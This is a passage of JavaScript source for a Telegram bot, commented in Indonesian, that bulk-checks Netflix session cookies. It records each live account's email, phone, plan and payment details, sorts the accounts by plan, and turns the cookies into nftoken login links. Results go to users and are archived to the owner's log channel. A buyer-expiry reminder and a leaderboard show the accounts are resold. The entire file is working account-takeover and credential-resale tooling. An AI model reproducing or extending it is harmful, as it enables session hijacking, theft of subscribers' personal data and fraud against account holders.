                const bulkLogText = `📢 <b>NEW CONVERT LOG (BULK LINK TO COOKIES)</b>\n👤 <b>Operator:</b> ${userDisplay}\n📦 <b>File Asal:</b> <code>${nameOfFile}</code>\n\n` + summaryText;
                await ctx.telegram.sendMessage(LOG_CHANNEL_ID, bulkLogText, { parse_mode: 'HTML' });
            } catch (logErr) {
                console.error("⚠️ Gagal mengirim log convert link to cookies ke channel log:", logErr.message);
            }

            if (liveCookiesResults.length > 0) {
                await ctx.replyWithDocument({ source: Buffer.from(liveCookiesResults.join('\n'), 'utf8'), filename: 'CONVERTED_COOKIES.txt' }, { caption: `🍪 <b>Berhasil Konversi (${liveCookiesResults.length} Cookies)</b>`, parse_mode: 'HTML' }).catch(() => {});
            }
            if (deadLinksResults.length > 0) {
                await ctx.replyWithDocument({ source: Buffer.from(deadLinksResults.join('\n'), 'utf8'), filename: 'FAILED_LINKS.txt' }, { caption: `❌ <b>Link Gagal/Expired (${deadLinksResults.length} Link)</b>`, parse_mode: 'HTML' }).catch(() => {});
            }

            bot.context.ownerBulkWaiting = false;
            return;
        }

        let cookiesToProcess = [];

        if (isZip) {
            const zipResponse = await axios.get(downloadUrl, { responseType: 'arraybuffer', timeout: 35000 });
            const zip = new AdmZip(Buffer.from(zipResponse.data));
            const zipEntries = zip.getEntries();

            zipEntries.forEach(entry => {
                if (!entry.isDirectory && entry.entryName.toLowerCase().endsWith('.txt') && !entry.entryName.includes('__MACOSX')) {
                    const txtContent = cleanCookieInput(entry.getData().toString('utf8'));
                    const extracted = extractCookiesFromRawText(txtContent);
                    cookiesToProcess = cookiesToProcess.concat(extracted);
                }
            });
        } else {
            const txtResponse = await axios.get(downloadUrl, { responseType: 'text', timeout: 25000 });
            const fileContent = cleanCookieInput(txtResponse.data);
            cookiesToProcess = extractCookiesFromRawText(fileContent);
        }

        if (cookiesToProcess.length === 0) {
            bot.context.ownerBulkWaiting = false;
            return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, "❌ Struktur format atau database cookies di dalam file tidak ditemukan.");
        }

        // ==========================================
        // 🌟 SISTEM FILTER COOKIES DUPLIKAT
        // ==========================================
        let uniqueCookies = [];
        let seenKeys = new Set();
        let duplicateCount = 0;

        for (const raw of cookiesToProcess) {
            const dict = parseCookies(raw);
            const netflixId = dict['NetflixId'];
            const em = parseTextData(raw).email;
            
            // Kunci unik: PRIORITASKAN EMAIL. Jika tidak ada email di teks, baru pakai NetflixId.
            const uniqueKey = em ? em.toLowerCase() : (netflixId ? netflixId : raw);

            if (seenKeys.has(uniqueKey)) {
                duplicateCount++; // Jika sudah ada, buang dan hitung sebagai duplikat
            } else {
                seenKeys.add(uniqueKey);
                uniqueCookies.push(raw); // Jika unik, masukkan ke antrean
            }
        }
        cookiesToProcess = uniqueCookies; // Timpa antrean lama dengan yang sudah bersih
        // ==========================================

        // Pastikan limit antrean sudah diset ke 150 ya bro!
        if (!isOwnerAction && cookiesToProcess.length > 150) {
            return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `❌ <b>AKSES BULK DITOLAK!</b>\n\nMaksimal antrean user adalah <b>150 Cookies</b>.\nFile Anda berisi: <code>${cookiesToProcess.length} Cookies</code>.`, { parse_mode: 'HTML' });
        }

        let premiumResults = [], standardResults = [], basicResults = [], holdPaymentResults = [], memberCancelResults = [], otherLiveResults = [], deadResults = [];
        let formattedLiveCookiesForMerge = []; // 🌟 PENAMPUNG BARIS COOKIES BERFORMAT LENGKAP UNTUK /satukan
        let index = 0, totalCookies = cookiesToProcess.length, lastUpdateTime = Date.now();
        let liveEmailsSeen = new Set(); // 🔥 Memori untuk mengingat email yang sudah di-save
        const formatProgressBar = (current, total) => {
            const percentage = Math.round((current / total) * 100);
            const filledBars = Math.round((percentage / 100) * 12);
            return `⚙️ <b>[${'▓'.repeat(filledBars)}${'░'.repeat(12 - filledBars)}] ${percentage}%</b>\n⏳ <code>Memproses: ${current}/${total} Cookies...</code>`;
        };

        const processCookieWorker = async (rawCookieData) => {
            const cookieDict = parseCookies(rawCookieData);
            if (!cookieDict['NetflixId']) { deadResults.push(rawCookieData); index++; return; }

            const cookieString = buildCookieString(cookieDict);
            const infoResult = await checkAccountInfo(cookieString);

            if (infoResult && infoResult.status === 'LIVE' && infoResult.plan !== 'Not Detected') {
                const textData = parseTextData(rawCookieData);
                const finalEmail = infoResult.email !== 'Not Detected' ? infoResult.email : (textData.email || 'UnknownEmail');
                // ==========================================================
                // 🔥 CEGAH AKUN GANDA (DOUBLE EMAIL) MASUK KE FILE HASIL 🔥
                // ==========================================================
                if (finalEmail !== 'UnknownEmail') {
                    const emailLower = finalEmail.toLowerCase();
                    if (liveEmailsSeen.has(emailLower)) {
                        duplicateCount++; // Tambah angka di laporan duplikat
                        index++; // Lanjut progress bar
                        return; // 🛑 BERHENTI! Buang akun ini, jangan di-save lagi.
                    }
                    liveEmailsSeen.add(emailLower); // Ingat email ini biar nanti kalo muncul lagi ditendang
                }
                // ==========================================================
                const finalPlan = infoResult.plan;
                const finalRegion = infoResult.country !== 'Not Detected' ? infoResult.country : (textData.region || 'Not Detected');
                
                const watchStatusText = infoResult.watchStatus || "✅ Unlocked Region (Bebas VPN)";
                const bulkVPN = watchStatusText.includes("Geo-Lock") ? "GEO-LOCK" : "UNLOCKED";
                
                const countryObj = getCountryDetail(finalRegion);
                const accountStatusText = infoResult.holdPaymentStatus;

                // --- MAPPING KUALITAS VIDEO DAN MAX STREAM BERDASARKAN PLAN ---
                let videoQuality = "SD";
                let maxStreams = "1";
                const planLower = finalPlan.toLowerCase();
                if (planLower.includes('prem') || planLower.includes('4k') || planLower.includes('cao cấp') || planLower.includes('özel')) {
                    videoQuality = "UHD";
                    maxStreams = "4";
                } else if (planLower.includes('stan') || planLower.includes('tiêu chuẩn')) {
                    videoQuality = "HD 1080p";
                    maxStreams = "2";
                } else if (planLower.includes('bas') || planLower.includes('temel') || planLower.includes('cơ bản')) {
                    videoQuality = "HD 720p";
                    maxStreams = "1";
                }

                // --- AMBIL DATA TAMBAHAN UNTUK FORMAT LENGKAP ---
                const finalPhone = (infoResult.apiPhone && infoResult.apiPhone !== 'Tidak Terdeteksi') ? infoResult.apiPhone : (textData.phone || '-');
                const finalNextBill = infoResult.nextBill !== 'Not Detected' ? infoResult.nextBill : (textData.nextBill || '-');
                const finalPayment = infoResult.payment !== 'Not Detected' ? infoResult.payment : (textData.payment || '-');
                const finalMemberSince = infoResult.memberSince !== 'Not Detected' ? infoResult.memberSince : (textData.memberSince || '-');
                const finalExtraMember = infoResult.extraMember === 'Yes' ? 'true' : 'false';
                
                // Cek status hold menjadi Yes / No
                let userOnHold = (accountStatusText.includes('HOLD') || accountStatusText.includes('SUSPENDED')) ? 'Yes' : 'No';

                // --- FORMAT BARIS LENGKAP SEPERTI SCREENSHOT ---
                const formattedLine = `${finalEmail} | Country = ${countryObj.name} ${countryObj.flag} | PhoneNumber = ${finalPhone} | MemberSince = ${finalMemberSince} | Plan = ${finalPlan} | VideoQuality = ${videoQuality} | MaxStreams = ${maxStreams} | NextBillingDate = ${finalNextBill} | PaymentMethod = ${finalPayment} | UserOnHold = ${userOnHold} | ExtraMember = ${finalExtraMember} | NetflixCookies = ${cookieString}`;
                
                if (accountStatusText.includes('HOLD') || accountStatusText.includes('SUSPENDED')) {
                    holdPaymentResults.push(formattedLine);
                } else if (accountStatusText.includes('CANCEL')) {
                    memberCancelResults.push(formattedLine);
                } else {
                    // 🌟 SIMPAN BARIS BERFORMAT LENGKAP UNTUK COMMAND /satukan
                    formattedLiveCookiesForMerge.push(formattedLine);

                    const lowerPlan = finalPlan.toLowerCase();
                    if (lowerPlan.includes('prem') || lowerPlan.includes('4k') || lowerPlan.includes('cao cấp') || lowerPlan.includes('özel')) premiumResults.push(formattedLine);
                    else if (lowerPlan.includes('stan') || lowerPlan.includes('tiêu chuẩn')) standardResults.push(formattedLine);
                    else if (lowerPlan.includes('bas') || lowerPlan.includes('temel') || lowerPlan.includes('cơ bản')) basicResults.push(formattedLine);
                    else otherLiveResults.push(formattedLine);
                }
            } else {
                const deadDict = parseCookies(rawCookieData);
                const deadCookieStr = buildCookieString(deadDict);
                const finalEmail = parseTextData(rawCookieData).email || 'UnknownEmail';
                deadResults.push(deadCookieStr ? `${finalEmail} : DEAD : ${deadCookieStr}` : rawCookieData);
            }

            index++;
            if (Date.now() - lastUpdateTime > 2200 || index === totalCookies) {
                lastUpdateTime = Date.now();
                await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, formatProgressBar(index, totalCookies), { parse_mode: 'HTML' }).catch(() => {});
            }
        };

        const CONCURRENCY = isOwnerAction ? 5 : 3; 
        for (let i = 0; i < cookiesToProcess.length; i += CONCURRENCY) {
            const chunk = cookiesToProcess.slice(i, i + CONCURRENCY);
            await Promise.all(chunk.map(c => processCookieWorker(c)));
            
            // 🔥 TAMBAHKAN JEDA 3 DETIK JUGA DI SINI BRO!
            await delay(3000);
        }

        await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id).catch(() => {});
        const totalLive = premiumResults.length + standardResults.length + basicResults.length + otherLiveResults.length + holdPaymentResults.length + memberCancelResults.length;
        if (totalLive > 0 && !isOwnerAction) addConvertScore(ctx.from.id, totalLive);

        // 🌟 SIMPAN HASIL BARIS BERFORMAT KE MEMORI UNTUK FITUR /satukan
        lastBulkResults.set(ctx.from.id, formattedLiveCookiesForMerge);

        logToPanel('BULK', { name: ctx.from.first_name, username: userDisplay, fileName: nameOfFile, total: cookiesToProcess.length, live: totalLive, dead: deadResults.length });

      const summaryText = `<b>📊 BULK CHECKING COMPLETED</b>\n─────────────────────\n✅ <b>Total Cookies LIVE:</b> ${totalLive}\n  ├ 👑 Premium: ${premiumResults.length}\n  ├ 💳 Standard: ${standardResults.length}\n  ├ 🛡️ Basic/Mobile: ${basicResults.length + otherLiveResults.length}\n  ├ ⚠️ Hold Payment: ${holdPaymentResults.length}\n  └ 🔴 Member Cancel: ${memberCancelResults.length}\n❌ <b>Cookies DEAD:</b> ${deadResults.length}\n♻️ <b>Cookies Duplikat:</b> ${duplicateCount} (Dibuang)\n📦 <b>Total Diproses:</b> ${totalLive + deadResults.length + duplicateCount}\n\n💡 <i>Gunakan command <code>/satukan</code> untuk menggabungkan seluruh cookies Live berformat lengkap ke dalam 1 file!</i>`;
        await ctx.reply(summaryText, { parse_mode: 'HTML' });

        // --- OWNER LOG ARSIP ---
        try {
            const bulkLogText = `📢 <b>NEW CONVERT LOG (BULK)</b>\n👤 <b>Operator:</b> ${userDisplay}\n📦 <b>File Asal:</b> <code>${nameOfFile}</code>\n\n` + summaryText;
            await ctx.telegram.sendMessage(LOG_CHANNEL_ID, bulkLogText, { parse_mode: 'HTML' });
            
            if (premiumResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(premiumResults.join('\n'), 'utf8'), filename: 'PLAN_PREMIUM_LIVE.txt' }, { caption: `👑 Premium Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (standardResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(standardResults.join('\n'), 'utf8'), filename: 'PLAN_STANDARD_LIVE.txt' }, { caption: `💳 Standard Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (basicResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(basicResults.join('\n'), 'utf8'), filename: 'PLAN_BASIC_LIVE.txt' }, { caption: `🛡️ Basic Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (otherLiveResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(otherLiveResults.join('\n'), 'utf8'), filename: 'PLAN_MOBILE_LIVE.txt' }, { caption: `📱 Mobile/Other Live Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (holdPaymentResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(holdPaymentResults.join('\n'), 'utf8'), filename: 'STATUS_HOLD_PAYMENT.txt' }, { caption: `⚠️ Hold Payment Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
            if (memberCancelResults.length > 0) await ctx.telegram.sendDocument(LOG_CHANNEL_ID, { source: Buffer.from(memberCancelResults.join('\n'), 'utf8'), filename: 'STATUS_MEMBER_CANCEL.txt' }, { caption: `🔴 Member Cancel Archive (Owner Log)`, parse_mode: 'HTML' }).catch(() => {});
        } catch (logErr) {
            console.error("⚠️ Gagal mengirim arsip bulk ke channel log:", logErr.message);
        }

        // =====================================================================
        // 🌟 MENGIRIM FILE HASIL SORTIR KE PENGGUNA SECARA LENGKAP
        // =====================================================================
        if (premiumResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(premiumResults.join('\n'), 'utf8'), filename: 'PLAN_PREMIUM_LIVE.txt' }, { caption: `👑 <b>Premium Live (${premiumResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (standardResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(standardResults.join('\n'), 'utf8'), filename: 'PLAN_STANDARD_LIVE.txt' }, { caption: `💳 <b>Standard Live (${standardResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (basicResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(basicResults.join('\n'), 'utf8'), filename: 'PLAN_BASIC_LIVE.txt' }, { caption: `🛡️ <b>Basic Live (${basicResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (otherLiveResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(otherLiveResults.join('\n'), 'utf8'), filename: 'PLAN_MOBOLE/STANDART.txt' }, { caption: `📱 <b>Mobile/Standart Live (${otherLiveResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (holdPaymentResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(holdPaymentResults.join('\n'), 'utf8'), filename: 'STATUS_HOLD_PAYMENT.txt' }, { caption: `⚠️ <b>Hold Payment (${holdPaymentResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (memberCancelResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(memberCancelResults.join('\n'), 'utf8'), filename: 'STATUS_MEMBER_CANCEL.txt' }, { caption: `🔴 <b>Member Cancel (${memberCancelResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        if (deadResults.length > 0) {
            await ctx.replyWithDocument({ source: Buffer.from(deadResults.join('\n'), 'utf8'), filename: 'COOKIES_MATI_DEAD.txt' }, { caption: `❌ <b>Semua Cookies Dead (${deadResults.length} Akun)</b>`, parse_mode: 'HTML' }).catch(() => {});
        }
        // ======================================================
        // --- TAMBAHAN BARU: FITUR BULK LINK LOGIN ---
        if (totalLive > 0) {
            // 1. Simpan array hasil masing-masing plan ke cache berdasarkan ID User
            bulkPlanCache.set(ctx.from.id, {
                premium: premiumResults,
                standard: standardResults,
                basic: basicResults,
                other: otherLiveResults
            });

            // 2. Tampilkan pertanyaan
            await ctx.reply("❓ <b>Apakah kamu ingin menjadikan hasil pengecekan ini sebagai Bulk Link Login?</b>", {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Ya, Jadikan Bulk Link', 'btn_bulk_link_yes')]
                ])
            });
        }

    } catch (error) {
        ctx.reply(`⚠️ Terjadi kesalahan internal saat memproses berkas bulk: ${error.message}`);
    } finally {
        bot.context.ownerBulkWaiting = false; 
    }
});

// --- CALLBACK ACTIONS UNTUK INTERFACE MENU ---
bot.action('btn_leaderboard', async (ctx) => {
    ctx.answerCbQuery("Loading Leaderboard...", { show_alert: false });
    let users = loadUsers();
    users.sort((a, b) => (b.count || 0) - (a.count || 0));
    let topTen = users.slice(0, 10);
    let textLeaderboard = `<b>🏆 TOP 10 RANKING CONVERTER CORVAST STORE</b>\n─────────────────────────────\n`;
    const medalEmojis = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"];
    if (topTen.length === 0) textLeaderboard += `<i>Belum ada data kompetisi.</i>\n`;
    else topTen.forEach((user, idx) => { textLeaderboard += `${medalEmojis[idx]} <b>${user.username}</b> — <code>${user.count || 0} Cookies</code>\n`; });
    let myRank = users.findIndex(u => u.id === ctx.from.id);
    textLeaderboard += `─────────────────────────────\n📊 <b>Peringkat Anda:</b> ${myRank !== -1 ? `#${myRank + 1}` : 'Belum Terdaftar'} (${myRank !== -1 ? (users[myRank].count || 0) : 0} Cookies)`;
    ctx.reply(textLeaderboard, { parse_mode: 'HTML' });
});

bot.action(/copy_(pc|app|tv)_(.+)/, async (ctx) => {
    const platform = ctx.match[1];
    const tokenId = ctx.match[2];
    const cachedData = tokenCache.get(tokenId);
    if (!cachedData) return ctx.answerCbQuery("❌ Token expired atau invalid.", { show_alert: true });
    let finalLink = '';
    if (platform === 'pc') finalLink = `https://www.netflix.com/account?nftoken=${cachedData.token}`;
    else if (platform === 'app') finalLink = `https://netflix.com/unsupported?nftoken=${cachedData.token}`;
    else if (platform === 'tv') finalLink = `https://netflix.com/tv8?nftoken=${cachedData.token}`;
    ctx.answerCbQuery(); 
    ctx.reply(`📋 *Link Login Siap Disalin:*\n\n\`${finalLink}\``, { parse_mode: 'Markdown' });
});

// ==========================================
// 🌟 CALLBACK ACTION UNTUK FITUR BULK LINK
// ==========================================

// Jika User klik "Ya" pada penawaran Bulk Link
bot.action('btn_bulk_link_yes', async (ctx) => {
    const userPlans = bulkPlanCache.get(ctx.from.id);
    if (!userPlans) {
        return ctx.answerCbQuery("⚠️ Data bulk terakhir tidak ditemukan atau sudah kedaluwarsa.", { show_alert: true });
    }
    
    ctx.answerCbQuery();
    await ctx.editMessageText("❓ <b>Mau jadikan link login apa?</b>\n\n<i>Pilih platform tujuan:</i>", {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('💻 PC', 'generate_bulk_link_pc'), Markup.button.callback('📱 MOBILE', 'generate_bulk_link_app')],
            [Markup.button.callback('📺 TV', 'generate_bulk_link_tv')]
        ])
    });
});


// Mengeksekusi pembuatan Link sesuai platform yang dipilih
bot.action(/generate_bulk_link_(pc|app|tv)/, async (ctx) => {
    const platform = ctx.match[1];
    const userPlans = bulkPlanCache.get(ctx.from.id);
    
    if (!userPlans) {
        return ctx.answerCbQuery("⚠️ Data bulk terakhir tidak ditemukan atau cache kedaluwarsa.", { show_alert: true });
    }

    ctx.answerCbQuery();
    
    const statusMsg = await ctx.editMessageText(`⏳ <b>Memproses Bulk Link Login (${platform.toUpperCase()})...</b>\n<i>Sedang menembak API Argo Netflix untuk enkripsi token. Mohon tunggu, proses ini butuh waktu...</i>`, { parse_mode: 'HTML' });
    
    const makeLinksAsync = async (cookieArray) => {
        let results = [];
        for (let row of cookieArray) {
            const cookieMatch = row.match(/NetflixCookies\s*=\s*(.+)$/i);
            if (!cookieMatch) continue;
            
            const rawCookieString = cookieMatch[1].trim();
            const tokenResult = await generateNfToken(rawCookieString);
            
            if (tokenResult && tokenResult.success && tokenResult.token) {
                const token = tokenResult.token;
                let link = '';
                if (platform === 'pc') link = `https://www.netflix.com/account?nftoken=${token}`;
                else if (platform === 'app') link = `https://netflix.com/unsupported?nftoken=${token}`;
                else if (platform === 'tv') link = `https://netflix.com/tv8?nftoken=${token}`;
                
                const email = row.split('|')[0].trim();
                const planMatch = row.match(/Plan\s*=\s*([^|]+)/i);
                const plan = planMatch ? planMatch[1].trim() : "Unknown Plan";
                
                results.push(`${email} | ${plan} | ${link}`);
            }
            await delay(2000); // Jeda aman
        }
        return results;
    };

    const premLinks = await makeLinksAsync(userPlans.premium);
    const stdLinks = await makeLinksAsync(userPlans.standard);
    const basicLinks = await makeLinksAsync(userPlans.basic);
    const otherLinks = await makeLinksAsync(userPlans.other);

    const platformName = platform.toUpperCase();

    if (premLinks.length > 0) {
        await ctx.replyWithDocument({ source: Buffer.from(premLinks.join('\n'), 'utf8'), filename: `BULK_LINK_${platformName}_PREMIUM.txt` }, { caption: `👑 Link Login Premium (${premLinks.length} Akun)`});
    }
    if (stdLinks.length > 0) {
        await ctx.replyWithDocument({ source: Buffer.from(stdLinks.join('\n'), 'utf8'), filename: `BULK_LINK_${platformName}_STANDARD.txt` }, { caption: `💳 Link Login Standard (${stdLinks.length} Akun)`});
    }
    if (basicLinks.length > 0) {
        await ctx.replyWithDocument({ source: Buffer.from(basicLinks.join('\n'), 'utf8'), filename: `BULK_LINK_${platformName}_BASIC.txt` }, { caption: `🛡️ Link Login Basic (${basicLinks.length} Akun)`});
    }
    if (otherLinks.length > 0) {
        await ctx.replyWithDocument({ source: Buffer.from(otherLinks.join('\n'), 'utf8'), filename: `BULK_LINK_${platformName}_MOBILE.txt` }, { caption: `📱 Link Login Mobile/Lainnya (${otherLinks.length} Akun)`});
    }
    
    // Gabungkan semua link untuk opsi "Satukan"
    const allGeneratedLinks = [...premLinks, ...stdLinks, ...basicLinks, ...otherLinks];
    
    // Simpan ke cache baru
    if (allGeneratedLinks.length > 0) {
        bulkLinkCache.set(ctx.from.id, {
            platform: platformName,
            links: allGeneratedLinks
        });
    }
    
    bulkPlanCache.delete(ctx.from.id); // Hapus cache lama
    
    // Tampilkan pertanyaan
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `🎉 <b>Sukses!</b>\nSemua enkripsi Bulk Link Login untuk <b>${platformName}</b> berhasil dibuat.\n\n❓ <b>Apakah kamu ingin menyatukan semua file plan tersebut menjadi satu file?</b>`, { 
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('📂 Satukan File', 'btn_merge_bulk_links'), Markup.button.callback('❌ Tidak', 'btn_no_merge_bulk_links')]
        ])
    });
});

// ==========================================
// 🌟 ACTION: SATUKAN FILE BULK LINK
// ==========================================
bot.action('btn_merge_bulk_links', async (ctx) => {
    const data = bulkLinkCache.get(ctx.from.id);
    
    if (!data || !data.links || data.links.length === 0) {
        return ctx.answerCbQuery("⚠️ Data link tidak ditemukan atau sudah kedaluwarsa.", { show_alert: true });
    }
    
    ctx.answerCbQuery("Menyatukan file...");
    
    const totalAkun = data.links.length;
    const fileBuffer = Buffer.from(data.links.join('\n'), 'utf8');
    
    await ctx.replyWithDocument(
        { source: fileBuffer, filename: `ALL_PLAN_BULK_LINK_${data.platform}.txt` },
        { caption: `📦 <b>Semua Plan Disatukan (${totalAkun} Akun)</b>\n<i>Berikut adalah gabungan seluruh link login platform ${data.platform}.</i>`, parse_mode: 'HTML' }
    );
    
    // Update pesan agar tombol hilang
    await ctx.editMessageText(`✅ <b>File berhasil disatukan dan dikirim!</b>`, { parse_mode: 'HTML' });
    
    // Bersihkan memori cache
    bulkLinkCache.delete(ctx.from.id);
});

// ==========================================
// 🌟 ACTION: TIDAK SATUKAN FILE
// ==========================================
bot.action('btn_no_merge_bulk_links', async (ctx) => {
    ctx.answerCbQuery();
    // Update pesan agar tombol hilang
    await ctx.editMessageText(`✅ <b>Baik, file bulk link dibiarkan terpisah per plan.</b>`, { parse_mode: 'HTML' });
    
    // Bersihkan memori cache
    bulkLinkCache.delete(ctx.from.id);
});
// Callback untuk menu "Pilih Mode Convert"
bot.action('btn_mode_convert', async (ctx) => {
    ctx.answerCbQuery();
    const modeText = `⚙️ <b>SILAKAN PILIH MODE CONVERT</b>\n\n` +
                     `Pilih metode konversi di bawah ini sesuai dengan kebutuhan data yang kamu miliki:`;
    
    ctx.reply(modeText, {
        parse_mode: 'HTML',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔄 Convert Link to Link', 'mode_link_to_link')],
            [Markup.button.callback('🍪 Convert Link to Cookies', 'mode_link_to_cookies')],
            [Markup.button.callback('🔗 Convert Cookies to Link', 'mode_cookies_to_link')]
        ])
    });
});

// SISTEM MENGUBAH DATABASE SEMENTARA (MEMORY MODE)
bot.action('mode_link_to_link', async (ctx) => {
    activeConvertModes.set(ctx.from.id, 'LINK_TO_LINK'); // Simpan Mode
    ctx.answerCbQuery();
    ctx.reply(`🟢 <b>Mode Active: Link to Link</b>\n\n👉 <i>Silakan langsung paste/kirimkan tautan Netflix Token Anda ke bot untuk memperbarui struktur tujuannya secara otomatis!</i>`, { parse_mode: 'HTML' });
});

bot.action('mode_link_to_cookies', async (ctx) => {
    activeConvertModes.set(ctx.from.id, 'LINK_TO_COOKIES'); // Simpan Mode
    ctx.answerCbQuery();
    ctx.reply(`🟢 <b>Mode Active: Link to Cookies</b>\n\n👉 <i>Silakan kirimkan tautan Netflix token Anda untuk diekstrak menjadi data cookies mentah!</i>`, { parse_mode: 'HTML' });
});

bot.action('mode_cookies_to_link', async (ctx) => {
    activeConvertModes.set(ctx.from.id, 'COOKIES_TO_LINK'); // Simpan Mode (Default)
    ctx.answerCbQuery();
    ctx.reply(`🟢 <b>Mode Active: Cookies to Link</b>\n\n👉 <i>Silakan paste teks cookies Anda atau drop file .txt / .zip bulk ke sini!</i>`, { parse_mode: 'HTML' });
});

bot.action('btn_tutorial', async (ctx) => { ctx.answerCbQuery(); ctx.reply(`📖 <b>Tutorial Login:</b>\n\n1. Pilih Mode dari menu /start.\n2. Kirim berkas/data/link sesuai mode yang aktif.\n3. Salin hasil convert terbaru dan nikmati bypass instan!`, { parse_mode: 'HTML' }); });

// --- TIMER REMINDER INTERVAL PEMBELI ---
setInterval(async () => {
    try {
        let pembeliList = loadPembeli();
        if (pembeliList.length === 0) return;
        const now = new Date();
        let remainingPembeli = [], expiredPembeli = [];
        for (let buyer of pembeliList) {
            if (now >= new Date(buyer.expiredAt)) expiredPembeli.push(buyer);
            else remainingPembeli.push(buyer);
        }
        if (expiredPembeli.length > 0) {
            savePembeli(remainingPembeli); 
            for (let expUser of expiredPembeli) {
                const messageReminder = `<b>REMINDER LOGOUT</b>\n──────────────────────────\n👤 <b>Data Buyer:</b> <code>${expUser.buyer}</code>\n❌ <b>Status Waktu:</b> HABIS / EXPIRED 🔴\n──────────────────────────\n📢 <i>Mohon infokan buyer di atas untuk melakukan LOGOUT sekarang.</i>`;
                await bot.telegram.sendMessage(REMINDER_CHANNEL_ID, messageReminder, { parse_mode: 'HTML' });
            }
        }
    } catch (err) { console.error("⚠️ Gagal memproses interval reminder pembeli:", err.message); }
}, 60 * 60 * 1000); 

bot.catch((err, ctx) => {
    console.error(`[Global Error] ⚠️ Terjadi kesalahan background:`, err.message);
});

async function startBotWithRetry() {
    try {
        console.log('⏳ Menghubungkan ke Telegram API...');
        await bot.launch({ polling: { timeout: 30 } });
        console.log('✅ Bot is actively listening via Polling mode.');
    } catch (err) {
        console.error('❌ Gagal meluncurkan bot:', err.message);
        setTimeout(startBotWithRetry, 5000); 
    }
}
startBotWithRetry();
process.on('unhandledRejection', (reason, p) => { console.log('⚠️ Unhandled Rejection at:', p, 'reason:', reason); });
